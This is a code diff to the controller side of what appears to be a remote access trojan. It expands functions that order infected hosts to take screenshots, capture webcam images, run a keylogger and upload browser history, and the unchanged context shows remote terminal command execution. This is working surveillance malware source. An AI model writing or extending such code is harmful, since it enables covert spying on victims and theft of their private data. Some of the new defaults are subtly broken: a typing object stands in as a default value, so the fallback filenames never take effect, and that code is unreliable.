@@ -4,6 +4,7 @@ from host import Host
 from threading import Thread
 from typing import List, Union
 from functools import wraps
+from pathlib import Path
 
 def check_connection(method):
     @wraps(method)
@@ -81,16 +82,18 @@ class Server:
             self.__hosts.remove(host)
 
     @check_connection
-    def screenshot(self, host:Host, name:str):
+    def screenshot(self, host:Host, name:str=Union[str,None]):
+        if not name: name = f"screenshot-{host.id}.png"
         self.__connector.send_str("screenshot", host.sock)
         self.__connector.recv_file(name, host.sock)
-        print(f"File has been saved as {name}")
+        return Path(name).absolute().as_posix()
 
     @check_connection
-    def camera(self, host:Host, name):
+    def camera(self, host:Host, name:str=Union[str,None]):
+        if not name: name = f"camera-{host.id}.png"
         self.__connector.send_str("camera", host.sock)
         self.__connector.recv_file(name, host.sock)
-        print(f"File has been saved as {name}")
+        return Path(name).absolute().as_posix()
 
     @check_connection
     def execute_in_terminal(self, host:Host, command):
@@ -106,6 +109,13 @@ class Server:
         print(">> Server has been inicialized")
 
     @check_connection
-    def active_keylogger(self, host:Host, time:str):
-        self.__connector.send_str("keylogger "+time, host.sock)
+    def active_keylogger(self, host:Host, time:int=10):
+        self.__connector.send_str("keylogger "+str(time), host.sock)
         return self.__connector.get_str(host.sock)
+
+    @check_connection
+    def get_browser_historial(self, host:Host, path_file:Union[str,None]=None, browser:str="edge"):
+        if not path_file: path_file = f"historial-{host.name}-{host.id}.csv"
+        self.__connector.send_str(f"historial {browser}", host.sock)
+        self.__connector.recv_file(path_file, host.sock)
+        return Path(path_file).absolute().as_posix()
